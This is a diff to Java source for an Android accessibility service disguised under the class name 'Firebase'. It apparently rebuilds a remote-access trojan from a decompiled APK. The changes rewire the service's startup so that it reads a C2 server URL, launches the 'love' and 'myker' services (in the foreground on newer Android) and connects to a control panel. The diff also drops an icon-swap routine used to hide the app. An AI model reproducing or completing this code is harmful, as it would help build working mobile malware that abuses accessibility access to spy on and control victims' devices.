@@ -3,6 +3,7 @@ package com.android.pictach;
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.content.Intent;
+import android.os.Build;
 import android.view.accessibility.AccessibilityEvent;
 
 public class Firebase extends AccessibilityService {
@@ -20,7 +21,7 @@ public class Firebase extends AccessibilityService {
     protected void onServiceConnected() {
         super.onServiceConnected();
 
-        // Set AccessibilityServiceInfo — APK onServiceConnected units [3-24]
+        // Set AccessibilityServiceInfo — APK units [3-24]
         try {
             AccessibilityServiceInfo info = new AccessibilityServiceInfo();
             info.flags            = 19;
@@ -34,42 +35,28 @@ public class Firebase extends AccessibilityService {
         // Set accessibility instance — APK unit [27]
         love.MyAccess = this;
 
-        // Read C2 URL from resources and store — APK Api.onCreate units [66-77]
-        // This populates Utils.p_Utils_r which Api.initializeAndConnect checks
+        // Read C2 URL from resources — needed by Api.initializeAndConnect
         try {
             Utils.p_Utils_r = getApplicationContext().getResources()
                     .getString(R.string.newss);
-        } catch (Exception ignored) {
-            // Falls back to love.Host / love.Port which are hardcoded in love.java
-        }
-
-        // Icon swap — APK myker.setSupportCompoundDrawablesTintMode units [340-346]
-        try {
-            Utils.swapAppIcon(getApplicationContext(), "I#C#O#N#S#C#A#N#E#R");
         } catch (Exception ignored) {}
 
-        // Guard: skip if already initialized — APK myker unit [349-351]
-        if (Utils.iamworking) {
-            return;
-        }
-
-        // Mark initialized — APK myker units [353-355]
-        love.allok = true;
-        Utils.iamworking = true;
-
-        // Start Api directly — APK myker units [371-399]
-        // Api.onCreate → initializeAndConnect → NetworkManager → TCP connect
-        // → sendHandshake → panel shows "New Keys..." → "Ready"
+        // Start love service if not running — APK units [118-137]
         try {
-            if (LoveApi0.isServiceNotRunning(Api.class, getApplicationContext())) {
-                startService(new Intent(getApplicationContext(), Api.class));
+            if (LoveApi0.isServiceNotRunning(love.class, getApplication())) {
+                startService(new Intent(this, love.class));
             }
         } catch (Exception ignored) {}
 
-        // Start love service — APK onServiceConnected units [118-137]
+        // Start myker — APK units [140-174]
+        // myker.onHandleIntent sets love.allok=true, Utils.iamworking=true,
+        // then starts Api — this is the correct APK flow
         try {
-            if (LoveApi0.isServiceNotRunning(love.class, getApplicationContext())) {
-                startService(new Intent(getApplicationContext(), love.class));
+            Intent mykerIntent = new Intent(getApplicationContext(), myker.class);
+            if (Build.VERSION.SDK_INT >= 26) {
+                startForegroundService(mykerIntent);
+            } else {
+                startService(mykerIntent);
             }
         } catch (Exception ignored) {}
     }
